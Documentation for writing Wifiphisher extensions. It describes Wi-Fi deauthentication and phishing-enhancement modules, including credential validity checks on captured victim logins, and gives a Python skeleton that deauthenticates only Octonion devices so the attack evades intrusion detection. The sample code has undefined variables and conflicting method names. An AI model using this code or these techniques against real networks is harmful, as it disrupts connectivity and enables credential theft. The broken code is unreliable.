Extensions
==========

Wifiphisher supports a scripting engine that allows users to write simple or
complicated modules in Python that are executed in parallel with efficiency and
expand the functionality of the tool. The extensions leverage a virtual wireless
interface that may or may not correspond directly to a physical card and 
operates in Monitor Mode, hence the extensions can read and write raw 802.11 packets.

Normally, the monitor interface is set in the same channel as the rogue Access
Point. However, if two physical cards are available on the system, Wifiphisher
will perform channel hopping to all the channels that are interesting to the
running extensions. 

Wifiphisher extensions do not run in a sandbox, hence it is recommended to never
run extensions from third parties unless you have carefully audited them
yourself.

The extensions typically fit in at least one of the below categories:

* Wi-Fi attacks. This is the most common case of an extension. Both denial-of-service (i.e. victim de-authentication) and automatic association attacks fit in this category.

* Phishing enhancements. In this category fit all the extensions that enhance a phishing scenario with various techniques. For example, we can dynamically adjust the phishing interface with something familiar to the victim user to create a more realistic page.  We can also perform various checks on the captured credentials to check their validity and present a relevant error message to the victim user. 

* Other. The rest of the extensions fall in this category. The examples here include binding Wifiphisher with another tool upon a specific event, printing custom UI messages or interacting with roguehostapd. 


Developing a Wifiphisher Extension
----------------------------------

In order to create an extension, the developer needs to create a file under the
"wifiphisher/extensions" directory. The first step is to define a class that has the 
name of the filename in camelcase. For example, deauth.py would have a Deauth()
class. Then the following callback methods are required:


*__init__(self, shared_data)*: Basic initialization method of the extension
where The extension manager passes all the data that may be required. The
shared_data is actually a dictionary that holds the following information:

.. code:: python

        shared_data = {
                        'is_freq_hop_allowed' boolean
                        'target_ap_channel': str
                        'target_ap_essid': str
                        'target_ap_bssid': str
                        'target_ap_encryption': str
                        'target_ap_logo_path': str
                        'rogue_ap_mac': str
                        'roguehostapd': Hostapd
                        'APs': list
                        'args': args
                    }


'APs' is a list of dictionaries where each dictionary represents an Access Point
discovered during the reconnaissance phase.

.. code:: python 

        AP = 'channel': str
        'essid': str
        'bssid': str
        'vendor': str

'args' is an argparse object containing all the arguments provided by the user. 

Note that the above values may be ‘None’ accordingly. For example, all the
target_* values will be None if there user did not target an Access Point (by
using --essid option). The ‘target_ap_logo_path’ will be None if the logo of the
specific vendor does not exist in the repository.          

*send_channels(self):* This callback is called once and the extension needs to
return a list of integers for all the channels that is interested to listen. The
Extension Manager will merge all the received lists to create a final list with
the channels that the monitor card needs to hop. 

*get_packet(self, pkt):* Callback to process individually each packet captured
from the interface in monitor mode and also send any frames in the air. The pkt
is actually a Scapy Dot11 packet. This callback needs to return a dictionary
with the channel number as the key and a list with the Dot11 packets as the
value.

The asterisk "*" as a key has a special meaning in this dictionary. It basically
means "send this packet to whichever channel is available". The reason for this,
is that we may want to broadcast frames without caring about the channel number.
For example, beacon frames that will always be processed by the stations that
perform passive scanning where channel number is not important. Instead of
putting a random channel number, we can put the asterisk to make our attack more
efficient.

For example,

{"6": Dot11_pkt1,
"*": Dot11_pkt2}

The above dictionary will instruct the Extension Manager to route Dot11_pkt1 to
channel 6 and Dot11_pkt2 to whatever available channel it can. That means that
if another extension is loaded and is sending frames to channel 7, the
Dot11_pkt2 will be sent to both channels 6 and 7.

*send_output(self):* Callback that returns in a list of strings the entry logs that
we need to display in the main screen. This callback is called almost continuously.

*on_exit(self):* Callback that is called once upon the exit of the software to
allow to the extensions to free any resources or perform other cleanup
operations.

As we mentioned earlier, an extension may perform a server-side processing of
the data received by the victim users during a phishing operation. Or an extension may dynamically adjust the phishing page upon render. For these cases, we use two special decorators "@uimethods.uitmethod" and "@extensions.register_backend_funcs". For more information on these, please read the tutorial on how to create a custom phishing scenario.

Now let's consider an example. Let's suppose that during a penetration testing,
"we noticed that the target infrastructure is using Internet-of-Things devices
from the Octonion S.A. As part of our testing, we want to run Wifiphisher and
get man-in-the-middle position in these devices. We also know that the target
infrastructure has employed a WIDS to detect intense deauth attacks. For this
reason, We want our attack to be limited to the Octonion devices only. We also
want to receive a status email now and then. 

Since what we want to do is a more complicated case, Wifiphisher options aren't
really helpful here. But luckily we can write our own extension to customize our
attack.

Here is what our extension will look like:


.. code:: python

        class deauthOctanion(): # Assuming filename is deauthoctanion.py

            def __init__(self, shared_data):
                self.data = shared_data
                self._packets_to_send = defaultdict(list)

            @staticmethod
            def _extract_bssid(packet):
                """
                Return the bssid of access point based on the packet type
                :param packet: A scapy.layers.RadioTap object
                :type packet: scapy.layers.RadioTap
                :return: bssid or None if it is WDS
                :rtype: str or None
                .. note: 0 0 -> IBBS
                         0 1 -> from AP
                         1 0 -> to AP
                """

                ds_value = packet.FCfield & 3
                to_ds = ds_value & 0x1 != 0
                from_ds = ds_value & 0x2 != 0

                # return the correct bssid based on the type
                return ((not to_ds and not from_ds and packet.addr3)
                        or (not to_ds and from_ds and packet.addr2)
                        or (to_ds and not from_ds and packet.addr1) or None)

            def send_channels(self):
                return [1,2,3,4,5,6,7,8,9,10,11,12]

            def get_packet(self, pkt):

                bssid = self._extract_bssid(pkt)
                # If this is an Octonion SA
                if bssid.startswith("9C:68:5B"):
                    # craft Deauthentication packet
                    deauth_part = dot11.Dot11(
                        type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
                    deauth_packet = (dot11.RadioTap() / deauth_part / dot11.Dot11Deauth())
                    if deauth_packet not in self._packets_to_send["*"]:
                        self._packets_to_send["*"] += deauth_packet

                    # Send Output
                    self.send_output = True

                return self._packets_to_send


            def send_mail():
                ...

            def send_output(self, pkt):
                if self.send_output:
                    self.send_mail()
                    return ["Found an Octonion device!"]
                
            def on_exit(self):
                pass


The above code should be self-explanatory. This is of course the basic skeleton.
The full code is left as an exercise for the reader :)
